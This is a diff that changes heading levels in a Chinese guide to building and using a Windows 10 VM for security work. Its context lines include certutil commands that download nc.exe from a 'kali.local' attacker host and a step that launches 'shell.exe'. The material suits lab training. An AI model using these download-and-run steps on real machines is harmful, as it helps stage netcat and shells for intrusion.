@@ -1,6 +1,6 @@
 图形化用户界面操作系统。
 
-# 1 准备
+## 1 准备
 
 Win10_22H2_Chinese_Simplified_x64v1.iso
 
@@ -30,7 +30,7 @@ https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion
 C:\Users\sec\Documents\Virtual Machines\windows
 ```
 
-# 2 配置
+## 2 配置
 
 **物理机**
 
@@ -221,7 +221,7 @@ VMware
 
 开启此虚拟机进行安装
 
-# 3 安装
+## 3 安装
 
 输入语言和其他首选项
 
@@ -371,7 +371,7 @@ sec
 
 关机，快照命名为 `安装` 
 
-# 4 初始化
+## 4 初始化
 
 **虚拟机**
 
@@ -511,7 +511,7 @@ C:\Users\sec
 > C:\Users\sec\AppData\Local\Packages\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TempState\ScreenClip
 > ```
 
-# 5 部署
+## 5 部署
 
 |                            虚拟机                            |
 | :----------------------------------------------------------: |
@@ -588,15 +588,15 @@ C:\Users\sec
 |                 [Xmind](https://xmind.app/)                  |
 |          [Yakit](https://github.com/yaklang/yakit)           |
 
-# 6 使用
+## 6 使用
 
-## 6.1 查看帮助
+### 6.1 查看帮助
 
 ```cmd
 C:\Users\Administrator> [command] /?
 ```
 
-## 6.2 历史命令
+### 6.2 历史命令
 
 查看历史命令
 
@@ -604,7 +604,7 @@ C:\Users\Administrator> [command] /?
 C:\Users\Administrator> doskey /history
 ```
 
-## 6.3 远程下载
+### 6.3 远程下载
 
 **bitsadmin**
 
@@ -632,7 +632,7 @@ C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc
 C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc.exe delete
 ```
 
-## 6.4 程序
+### 6.4 程序
 
 运行程序
 
@@ -640,7 +640,7 @@ C:\Users\Administrator> certutil -urlcache -split -f http://kali.local/upload/nc
 C:\Users\Administrator> start shell.exe
 ```
 
-## 6.5 修改编码
+### 6.5 修改编码
 
 查看当前编码
 
@@ -666,7 +666,7 @@ C:\Users\Administrator> chcp 65001
 949		EUC-KR		韩语
 ```
 
-## 6.6 用户管理
+### 6.6 用户管理
 
 查看用户名
 
@@ -753,23 +753,23 @@ net user admin /del
 The command completed successfully.
 ```
 
-## 6.7 文件权限
+### 6.7 文件权限
 
 ![文件权限](./../../../../../../images/Windows%2010/%E4%BD%BF%E7%94%A8/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90.png)
 
-## 6.8 查看进程
+### 6.8 查看进程
 
 ```cmd
 C:\Users\Administrator> netstat -ano
 ```
 
-## 6.9 查看系统架构
+### 6.9 查看系统架构
 
 ```cmd
 C:\Users\Administrator> wmic os get osarchitecture
 ```
 
-## 6.10 添加环境变量
+### 6.10 添加环境变量
 
 添加环境变量
 
@@ -782,23 +782,23 @@ C:\Users\Administrator> wmic os get osarchitecture
 > %USERPROFILE%\AppData\Local\Microsoft\WindowsApps;D:\software\Microsoft VS Code\bin;D:\software\SDelete
 > ```
 
-## 6.11 临时文件夹
+### 6.11 临时文件夹
 
 ```powershell
 PS C:\Users\sec> dir C:\Windows\Temp
 ```
 
-## 6.12 添加快捷访问
+### 6.12 添加快捷访问
 
 ![添加快捷访问](./../../../../../../images/Windows%2010/%E4%BD%BF%E7%94%A8/%E6%B7%BB%E5%8A%A0%E5%BF%AB%E6%8D%B7%E8%AE%BF%E9%97%AE.png)
 
-## 6.13 查看网络
+### 6.13 查看网络
 
 ```cmd
 C:\Users\Administrator> route print
 ```
 
-## 6.14 权限
+### 6.14 权限
 
 ```
 SYSTEM : 系统权限，可对系统文件进行修改
@@ -808,7 +808,7 @@ Administrator : 可以通过 psexec 获取 SYSTEM 权限
 Administrator : 用户读取其它进程内存需要获取 debug 权限，SYSTEM 不需要
 ```
 
-## 6.15 修复
+### 6.15 修复
 
 扫描系统文件的完整性，并修复受损的文件
 
@@ -816,7 +816,7 @@ Administrator : 用户读取其它进程内存需要获取 debug 权限，SYSTEM
 C:\Users\Administrator> sfc /scannow
 ```
 
-## 6.16 禁用 WSL
+### 6.16 禁用 WSL
 
 列出当前系统上安装的 WSL 发行版
 
@@ -846,7 +846,7 @@ PS C:\Users\sec> wslconfig /l
 
 ![关闭虚拟机平台](./../../../../../../images/Windows%2010/%E4%BD%BF%E7%94%A8/%E5%85%B3%E9%97%AD%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%B9%B3%E5%8F%B0.png)
 
-## 6.17 删除
+### 6.17 删除
 
 要删除一个文件，你可以运行：
 
